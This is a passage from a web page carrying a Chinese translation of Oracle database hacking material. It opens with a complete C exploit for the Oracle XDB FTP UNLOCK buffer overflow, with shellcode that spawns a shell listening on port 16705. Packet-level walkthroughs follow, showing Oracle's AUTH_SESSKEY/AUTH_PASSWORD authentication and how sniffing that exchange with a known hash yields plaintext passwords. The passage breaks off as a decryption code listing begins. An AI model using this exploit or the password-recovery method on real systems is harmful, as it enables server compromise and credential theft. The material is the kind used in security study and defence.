class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line">#include &lt;netdb.h&gt;</span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">      struct hostent *he;</span><br><span class="line">      struct sockaddr_in sa;</span><br><span class="line">      int sock;</span><br><span class="line">      unsigned int addr = 0;</span><br><span class="line">      char recvbuffer[512]=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">      char user[260]=&quot;user &quot;;</span><br><span class="line">      char passwd[260]=&quot;pass &quot;;</span><br><span class="line">      int rcv=0;</span><br><span class="line">      int snd =0;</span><br><span class="line">      int count = 0;</span><br><span class="line">      unsigned char nop_sled[1804]=&quot;&quot;;</span><br><span class="line">      unsigned char saved_return_address[]=&quot;\x41\xc8\xff\xbf&quot;;</span><br><span class="line">      unsigned char exploit[2100]=&quot; unlock / AAAABBB&quot;</span><br><span class="line">      &quot;BCCCCDDDDEEEEFFF&quot;</span><br><span class="line">      &quot;FGGGGHHHHIIIIJJJ&quot;</span><br><span class="line">      &quot;JKKKKLLLLMMMMNNN&quot;</span><br><span class="line">      &quot;NOOOOPPPPQQQQRRR&quot;</span><br><span class="line">      &quot;RSSSSTTTTUUUUVVV&quot;</span><br><span class="line">      &quot;VWWWWXXXXYYYYZZZ&quot;</span><br><span class="line">      &quot;Zaaaabbbbccccdd&quot;;</span><br><span class="line"></span><br><span class="line">      unsigned char</span><br><span class="line">code[]=&quot;\x31\xdb\x53\x43\x53\x43\x53\x4b\x6a\x66\x58\x54\x59\xcd&quot;</span><br><span class="line">      &quot;\x80\x50\x4b\x53\x53\x53\x66\x68\x41\x41\x43\x43\x66\x53&quot;</span><br><span class="line">      &quot;\x54\x59\x6a\x10\x51\x50\x54\x59\x6a\x66\x58\xcd\x80\x58&quot;</span><br><span class="line">      &quot;\x6a\x05\x50\x54\x59\x6a\x66\x58\x43\x43\xcd\x80\x58\x83&quot;</span><br><span class="line">      &quot;\xec\x10\x54\x5a\x54\x52\x50\x54\x59\x6a\x66\x58\x43\xcd&quot;</span><br><span class="line">      &quot;\x80\x50\x31\xc9\x5b\x6a\x3f\x58\xcd\x80\x41\x6a\x3f\x58&quot;</span><br><span class="line">      &quot;\xcd\x80\x41\x6a\x3f\x58\xcd\x80\x6a\x0b\x58\x99\x52\x68&quot;</span><br><span class="line">      &quot;\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x54\x5b\x52\x53\x54&quot;</span><br><span class="line">      &quot;\x59\xcd\x80\r\n&quot;;</span><br><span class="line">      if(argc !=4)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;\n\n\tOracle XDB FTP Service UNLOCK Buffer Overflow</span><br><span class="line">Exploit&quot;);</span><br><span class="line">            printf(&quot;\n\t\tfor Blackhat (http://www.blackhat.com)&quot;);</span><br><span class="line">            printf(&quot;\n\n\tSpawns a shell listening on TCP Port 16705&quot;);</span><br><span class="line">            printf(&quot;\n\n\tUsage:\t%s host userid password&quot;,argv[0]);</span><br><span class="line">            printf(&quot;\n\n\tDavid Litchfield\n\t(david@ngssoftware.com)&quot;);</span><br><span class="line">            printf(&quot;\n\t7th July 2003\n\n\n&quot;);</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line">      while(count &lt; 1800)</span><br><span class="line">            nop_sled[count++]=0x90;</span><br><span class="line"></span><br><span class="line">      // Build the exploit</span><br><span class="line">      strcat(exploit,saved_return_address);</span><br><span class="line">      strcat(exploit,nop_sled);</span><br><span class="line">      strcat(exploit,code);</span><br><span class="line"></span><br><span class="line">      // Process arguments</span><br><span class="line">      strncat(user,argv[2],240);</span><br><span class="line">      strncat(passwd,argv[3],240);</span><br><span class="line">      strcat(user,&quot;\r\n&quot;);</span><br><span class="line">      strcat(passwd,&quot;\r\n&quot;);</span><br><span class="line"></span><br><span class="line">      // Setup socket stuff</span><br><span class="line">      sa.sin_addr.s_addr=INADDR_ANY;</span><br><span class="line">      sa.sin_family = AF_INET;</span><br><span class="line">      sa.sin_port = htons((unsigned short) 2100);</span><br><span class="line"></span><br><span class="line">      // Resolve the target system</span><br><span class="line">      if(isalpha(argv[1][0])==0)</span><br><span class="line">      &#123;</span><br><span class="line">            addr = inet_addr(argv[1]);</span><br><span class="line">            memcpy(&amp;sa.sin_addr,&amp;addr,4);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">            he = gethostbyname(argv[1]);</span><br><span class="line">            if(he == NULL)</span><br><span class="line">                  return printf(&quot;Couldn&#x27;t resolve host %s\n&quot;,argv[1]);</span><br><span class="line">            memcpy(&amp;sa.sin_addr,he-&gt;h_addr,he-&gt;h_length);</span><br><span class="line">      &#125;</span><br><span class="line">      sock = socket(AF_INET,SOCK_STREAM,0);</span><br><span class="line">      if(sock &lt; 0)</span><br><span class="line">            return printf(&quot;socket() failed.\n&quot;);</span><br><span class="line">      if(connect(sock,(struct sockaddr *) &amp;sa,sizeof(sa)) &lt; 0)</span><br><span class="line">      &#123;</span><br><span class="line">            close(sock);</span><br><span class="line">                  return printf(&quot;connect() failed.\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      printf(&quot;\nConnected to %s....\n&quot;,argv[1]);</span><br><span class="line"></span><br><span class="line">      // Receive and print banner</span><br><span class="line">      rcv = recv(sock,recvbuffer,508,0);</span><br><span class="line">      if(rcv &gt; 0)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;%s\n&quot;,recvbuffer);</span><br><span class="line">            bzero(recvbuffer,rcv+1);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">            close(sock);</span><br><span class="line">            return printf(&quot;Problem with recv()\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // send user command</span><br><span class="line">      snd = send(sock,user,strlen(user),0);</span><br><span class="line">      if(snd != strlen(user))</span><br><span class="line">      &#123;</span><br><span class="line">            close(sock);</span><br><span class="line">            return printf(&quot;Problem with send()....\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line"></span><br><span class="line">            printf(&quot;%s&quot;,user);</span><br><span class="line">      &#125;</span><br><span class="line">      // Receive response. Response code should be 331</span><br><span class="line">      rcv = recv(sock,recvbuffer,508,0);</span><br><span class="line">      if(rcv &gt; 0)</span><br><span class="line">      &#123;</span><br><span class="line">            if(recvbuffer[0]==0x33 &amp;&amp; recvbuffer[1]==0x33 &amp;&amp;</span><br><span class="line">recvbuffer[2]==0x31)</span><br><span class="line">            &#123;</span><br><span class="line">                  printf(&quot;%s\n&quot;,recvbuffer);</span><br><span class="line">                  bzero(recvbuffer,rcv+1);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                  close(sock);</span><br><span class="line">                  return printf(&quot;FTP response code was not 331.\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">            close(sock);</span><br><span class="line">            return printf(&quot;Problem with recv()\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // Send pass command</span><br><span class="line">      snd = send(sock,passwd,strlen(passwd),0);</span><br><span class="line">      if(snd != strlen(user))</span><br><span class="line">      &#123;</span><br><span class="line">            close(sock);</span><br><span class="line">            return printf(&quot;Problem with send()....\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">            printf(&quot;%s&quot;,passwd);</span><br><span class="line"></span><br><span class="line">      // Receive reponse. If not 230 login has failed.</span><br><span class="line">      rcv = recv(sock,recvbuffer,508,0);</span><br><span class="line">      if(rcv &gt; 0)</span><br><span class="line">      &#123;</span><br><span class="line">            if(recvbuffer[0]==0x32 &amp;&amp; recvbuffer[1]==0x33 &amp;&amp;</span><br><span class="line">recvbuffer[2]==0x30)</span><br><span class="line">            &#123;</span><br><span class="line">                  printf(&quot;%s\n&quot;,recvbuffer);</span><br><span class="line">                  bzero(recvbuffer,rcv+1);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                  close(sock);</span><br><span class="line">                  return printf(&quot;FTP response code was not 230. Login</span><br><span class="line">failed...\n&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">     else</span><br><span class="line">     &#123;</span><br><span class="line">          close(sock);</span><br><span class="line">          return printf(&quot;Problem with recv()\n&quot;);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     // Send the UNLOCK command with exploit</span><br><span class="line">     snd = send(sock,exploit,strlen(exploit),0);</span><br><span class="line">     if(snd != strlen(exploit))</span><br><span class="line">     &#123;</span><br><span class="line">          close(sock);</span><br><span class="line">          return printf(&quot;Problem with send()....\n&quot;);</span><br><span class="line">     &#125;</span><br><span class="line">     // Should receive a 550 error response.</span><br><span class="line">     rcv = recv(sock,recvbuffer,508,0);</span><br><span class="line">     if(rcv &gt; 0)</span><br><span class="line">     printf(&quot;%s\n&quot;,recvbuffer);</span><br><span class="line">     printf(&quot;\n\nExploit code sent....\n\nNow telnet to %s</span><br><span class="line">16705\n\n&quot;,argv[1]);</span><br><span class="line">     close(sock);</span><br><span class="line">     return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="攻击身份验证过程"><a href="#攻击身份验证过程" class="headerlink" title="攻击身份验证过程"></a>攻击身份验证过程</h2><p>​        获得对数据库及其数据的完全访问权限是大多数攻击者的最终选择，但仅获得任何访问权限就是第一步。 对于尚未拥有用户ID或密码的用户，必须首先绕过身份验证过程。 这样做既可以像利用缓冲区溢出一样技术，也可以像进行蛮力攻击一样简单，也可以简单地获取用户ID和密码。 本章涉及通过攻击身份验证过程来访问数据库服务器本身。</p><h3 id="如何进行身份验证"><a href="#如何进行身份验证" class="headerlink" title="如何进行身份验证"></a>如何进行身份验证</h3><p>​        尝试登录数据库时，客户端首先连接到TNS侦听器并请求访问数据库服务。 以下代码显示了示例连接的数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 320</span><br><span class="line">      Identifier: 9373</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line"></span><br><span class="line">      Checksum: 0x532d</span><br><span class="line">      Source IP: 192.168.0.120</span><br><span class="line">      Dest IP: 192.168.0.37</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 1916</span><br><span class="line">      Dest port: 1521</span><br><span class="line">      Sequence: 2802498112</span><br><span class="line">      ack: 2168229595</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH)</span><br><span class="line">      Window Size: 17520</span><br><span class="line">      Checksum: 0x4915</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      01 18 00 00 01 00 00 00 01 39 01 2c 00 00 08 00           9 ,</span><br><span class="line">      7f ff c6 0e 00 00 01 00 00 de 00 3a 00 00 02 00             :</span><br><span class="line">      61 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00  aa</span><br><span class="line">      00 00 00 00 00 00 00 00 00 00 28 44 45 53 43 52            (DESCR</span><br><span class="line">      49 50 54 49 4f 4e 3d 28 41 44 44 52 45 53 53 3d  IPTION=(ADDRESS=</span><br><span class="line">      28 50 52 4f 54 4f 43 4f 4c 3d 54 43 50 29 28 48  (PROTOCOL=TCP)(H</span><br><span class="line">      4f 53 54 3d 31 39 32 2e 31 36 38 2e 30 2e 33 37  OST=192.168.0.37</span><br><span class="line">      29 28 50 4f 52 54 3d 31 35 32 31 29 29 28 43 4f  )(PORT=1521))(CO</span><br><span class="line">      4e 4e 45 43 54 5f 44 41 54 41 3d 28 53 45 52 56  NNECT_DATA=(SERV</span><br><span class="line">      45 52 3d 44 45 44 49 43 41 54 45 44 29 28 53 45  ER=DEDICATED)(SE</span><br><span class="line">      52 56 49 43 45 5f 4e 41 4d 45 3d 6f 72 61 38 31  RVICE_NAME=ora81</span><br><span class="line">      37 2e 6e 67 73 73 6f 66 74 77 61 72 65 2e 63 6f  7.ngssoftware.co</span><br><span class="line">      6d 29 28 43 49 44 3d 28 50 52 4f 47 52 41 4d 3d  m)(CID=(PROGRAM=</span><br><span class="line">      43 3a 5c 6f 72 61 63 6c 65 5c 70 72 6f 64 75 63  C:\oracle\produc</span><br><span class="line">      74 5c 31 30 2e 32 2e 30 5c 64 62 5f 31 5c 62 69  t\10.2.0\db_1\bi</span><br><span class="line">      6e 5c 73 71 6c 70 6c 75 73 2e 65 78 65 29 28 48  n\sqlplus.exe)(H</span><br><span class="line">      4f 53 54 3d 4f 52 41 29 28 55 53 45 52 3d 6f 72  OST=ORA)(USER=or</span><br><span class="line">      61 63 6c 65 29 29 29 29                          acle)))))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        请注意SERVICE_NAME条目= ora817.ngssoftware.com。 如果此服务尚未在TNS侦听器中注册，则该侦听器将生成一个错误。 如果该服务已注册，则侦听器将重定向客户端以连接到另一个TCP端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 104</span><br><span class="line">      Identifier: 32335</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0xfa52</span><br><span class="line">      Source IP: 192.168.0.37</span><br><span class="line">      Dest IP: 192.168.0.120</span><br><span class="line"></span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 1521</span><br><span class="line">      Dest port: 1916</span><br><span class="line">      Sequence: 2168229595</span><br><span class="line">      ack: 2802498392</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH )</span><br><span class="line">      Window Size: 65255</span><br><span class="line">      Checksum: 0xe663</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      00 40 00 00 05 00 00 00 00 36 28 41 44 44 52 45   @       6(ADDRE</span><br><span class="line">      53 53 3d 28 50 52 4f 54 4f 43 4f 4c 3d 74 63 70  SS=(PROTOCOL=tcp</span><br><span class="line">      29 28 48 4f 53 54 3d 31 39 32 2e 31 36 38 2e 30  )(HOST=192.168.0</span><br><span class="line">      2e 33 37 29 28 50 4f 52 54 3d 33 35 39 30 29 29  .37)(PORT=3590))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        在这种情况下，客户端将重定向到TCP端口3590。如果服务器以MTS（多线程服务器）模式运行，则客户端将不会重定向，并且所有通信都将通过侦听器端口进行-在这种情况下为1521。 客户端连接到新端口后，它将发出与连接到侦听器时相同的服务请求。</p><p>​        在客户端的序言连接到侦听器等之后，身份验证过程就开始了。 客户端通过向服务器发送其用户名来实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 236</span><br><span class="line">      Identifier: 59545</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0x8f84</span><br><span class="line">      Source IP: 192.168.0.37</span><br><span class="line">      Dest IP: 192.168.0.120</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 2500</span><br><span class="line">      Dest port: 1521</span><br><span class="line">      Sequence: 668563957</span><br><span class="line">      ack: 2568057659</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH )</span><br><span class="line">      Window Size: 32780</span><br><span class="line">      Checksum: 0x65e8</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line"></span><br><span class="line">Raw Data</span><br><span class="line">      00 c4 00 00 06 00 00 00 00 00 03 76 02 b0 5f df             v _</span><br><span class="line">      00 06 00 00 00 01 00 00 00 58 cc 12 00 04 00 00           X</span><br><span class="line">      00 28 ca 12 00 14 ce 12 00 06 73 79 73 74 65 6d   (        system</span><br><span class="line">      0d 00 00 00 0d 41 55 54 48 5f 54 45 52 4d 49 4e       AUTH_TERMIN</span><br><span class="line">      41 4c 07 00 00 00 07 47 4c 41 44 49 55 53 00 00  AL     GLADIUS</span><br><span class="line">      00 00 0f 00 00 00 0f 41 55 54 48 5f 50 52 4f 47         AUTH_PROG</span><br><span class="line">      52 41 4d 5f 4e 4d 0b 00 00 00 0b 53 51 4c 50 4c  RAM_NM     SQLPL</span><br><span class="line">      55 53 2e 45 58 45 00 00 00 00 0c 00 00 00 0c 41  US.EXE         A</span><br><span class="line">      55 54 48 5f 4d 41 43 48 49 4e 45 11 00 00 00 11  UTH_MACHINE</span><br><span class="line">      57 4f 52 4b 47 52 4f 55 50 5c 47 4c 41 44 49 55  WORKGROUP\GLADIU</span><br><span class="line">      53 00 00 00 00 08 00 00 00 08 41 55 54 48 5f 50  S         AUTH_P</span><br><span class="line">      49 44 09 00 00 00 09 35 35 37 36 3a 35 34 35 36  ID     5576:5456</span><br><span class="line">      00 00 00 00</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        在前面的数据包转储中，用户名是system。服务器使用此用户名并检查其是否为有效用户。如果不是，则服务器向客户端发送“拒绝登录”错误。如果用户名确实存在，则服务器从数据库中提取用户的密码哈希。服务器使用此哈希值创建一个秘密号码。</p><p>​        密码创建如下：服务器调用orageneric库中的slgdt（）函数。此函数实质上检索系统时间。分钟，小时，毫秒和秒都以WORD的形式存储在一起，以形成要加密的“文本”的八个字节。加密中使用的密钥的前四个字节表示与用户的十六进制密码哈希值的后四个字节异或的分钟和小时；密钥的最后四个字节由毫秒和秒组成，与用户的十六进制密码哈希值的前四个字节进行异或。该密钥用于通过调用oracommon库中的kzsrenc（）函数来加密文本。此函数基本上使用lncgks（）函数执行DES密钥调度，然后使用lncecb（）函数在ECB模式下使用DES输出密文。</p><p>​        此处生成的密文成为密码。然后，再次使用kzsrenc（）函数，使用用户的密码哈希对该密文进行加密；结果就是AUTH_SESSKEY。然后将其发送给客户端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 185</span><br><span class="line">      Identifier: 52755</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0xaa3d</span><br><span class="line"></span><br><span class="line">      Source IP: 192.168.0.120</span><br><span class="line">      Dest IP: 192.168.0.37</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 1521</span><br><span class="line">      Dest port: 2500</span><br><span class="line">      Sequence: 2568057659</span><br><span class="line">      ack: 668564153</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH)</span><br><span class="line">      Window Size: 16275</span><br><span class="line">      Checksum: 0x4c2d</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      00 91 00 00 06 00 00 00 00 00 08 01 00 0c 00 00</span><br><span class="line">      00 0c 41 55 54 48 5f 53 45 53 53 4b 45 59 10 00   AUTH_SESSKEY</span><br><span class="line">      00 00 10 36 43 43 33 37 42 41 33 44 41 37 39 37    6CC37BA3DA797</span><br><span class="line">      35 44 36 00 00 00 00 04 01 00 00 00 00 00 00 00 5D6</span><br><span class="line">      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">      00 00 02 00 00 00 00 00 00 36 01 00 00 00 00 00          6</span><br><span class="line">      00 b8 00 8b 0a 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">      00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">      00</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        客户端收到AUTH_SESSKEY后，必须对其解密以检索密码。 用户使用oracore库中的lncupw（）函数创建自己的密码哈希的副本。 然后，通过调用kzsrdec（）函数，将此哈希用作解密AUTH_SESSKEY的密钥。 如果一切顺利，则应该生成密码。 然后，通过调用kzsrenp（）函数，将此秘密数字用作加密用户明文，区分大小写的密码的密钥。 该功能执行DES密钥调度，并以CBC模式加密用户密码。 密文然后作为AUTH_PASSWORD发送回服务器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">IP Header</span><br><span class="line">      Length and version: 0x45</span><br><span class="line">      Type of service: 0x00</span><br><span class="line">      Total length: 839</span><br><span class="line">      Identifier: 59546</span><br><span class="line">      Flags: 0x4000</span><br><span class="line">      TTL: 128</span><br><span class="line">      Protocol: 6 (TCP)</span><br><span class="line">      Checksum: 0x8d28</span><br><span class="line">      Source IP: 192.168.0.37</span><br><span class="line">      Dest IP: 192.168.0.120</span><br><span class="line">TCP Header</span><br><span class="line">      Source port: 2500</span><br><span class="line">      Dest port: 1521</span><br><span class="line"></span><br><span class="line">      Sequence: 668564153</span><br><span class="line">      ack: 2568057804</span><br><span class="line">      Header length: 0x50</span><br><span class="line">      Flags: 0x18 (ACK PSH )</span><br><span class="line">      Window Size: 32762</span><br><span class="line">      Checksum: 0x0838</span><br><span class="line">      Urgent Pointer: 0</span><br><span class="line">Raw Data</span><br><span class="line">      03 1f 00 00 06 00 00 00 00 00 03 73 03 b0 5f df             s _</span><br><span class="line">      00 06 00 00 00 01 01 00 00 1c da 12 00 07 00 00</span><br><span class="line">      00 88 d6 12 00 3c dc 12 00 06 73 79 73 74 65 6d       &lt;    system</span><br><span class="line">      0d 00 00 00 0d 41 55 54 48 5f 50 41 53 53 57 4f       AUTH_PASSWO</span><br><span class="line">      52 44 11 00 00 00 11 36 36 36 43 41 46 45 36 37  RD     666CAFE67</span><br><span class="line">      34 39 43 39 44 37 37 30 00 00 00 00 0d 00 00 00  49C9D770</span><br><span class="line">      ....</span><br><span class="line">      ....</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        服务器通过调用oracommon库中的kzsrdep（）函数，以用作密钥的机密数字解密AUTH_PASSWORD。服务器现在拥有明文密码的副本。然后，服务器创建密码哈希，并将其与数据库中的哈希进行比较。如果它们匹配，则对用户进行身份验证。然后由服务器执行检查，以确定用户是否具有CREATE SESSION特权；如果是这样，则授予用户访问数据库服务器的权限。</p><p>​        针对Windows NT上运行的Oracle 8.1.7.4执行了此分析。尽管实际的函数名称可能有所不同，但其他Oracle版本上的一般过程相同。</p><p>​        简要返回AUTH_PASSWORD，由于密码的加密方式，您可以获取有关密码长度的信息。如果AUTH_PASSWORD为16个字符长，则实际密码为8个字符或更少。如果用户的密码长度在9到16个字符之间，则AUTH_PASSWORD的长度是32个字符，依此类推。因此，如果攻击者可以嗅探整个网络上的身份验证，那么他们可以派生出可能在密码破解尝试中有用的信息。</p><h3 id="攻击加密过程"><a href="#攻击加密过程" class="headerlink" title="攻击加密过程"></a>攻击加密过程</h3><p>​        从数据库中获取密码哈希值是一项简单的任务，正如本书所展示的。可以执行强行强制Oracle密码散列，但是密码越长，花费的时间就越长。对于很长的密码，不是强行使用密码，而是另一种攻击方法，目的是快速获取明文。如果拥有哈希但想要纯文本的攻击者可以嗅探网络上的AUTH_SESSKEY和AUTH_PASSWORD交换，那么他们可以立即获得纯文本密码。他们使用已知的哈希对AUTH_SESSKEY进行解密以获取密码。然后，他们使用此秘密数字解密AUTH_PASSWORD，然后解出明文-不管它有多长。嗅探交换是真正的问题-但这不应该被诸如“好吧，如果他们遇到了我的密码哈希并可以从网络上捕获流量的问题，那么我就会遇到更大的问题”。在交换环境中，针对ARP的攻击可能导致流量在本地线路上广播，这意味着每个人都可以捕获流量。当然，在普通广播网络上（例如，使用普通集线器的以太网），这不是问题，并且以混杂模式运行的嗅探器可以进行交换。客户端和服务器之间中间位置的主机或网关可能会受到威胁，并被用作战略嗅探器。是的，如果有人可以这样做，您确实会遇到很大的问题，但重点是攻击者可以并且可以这样做！</p><p>​        以下代码使用kzsrdec（）和kzsrdep（）函数获取给定密码哈希，AUTH_SESSKEY和AUTH_PASSWORD的明文密码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 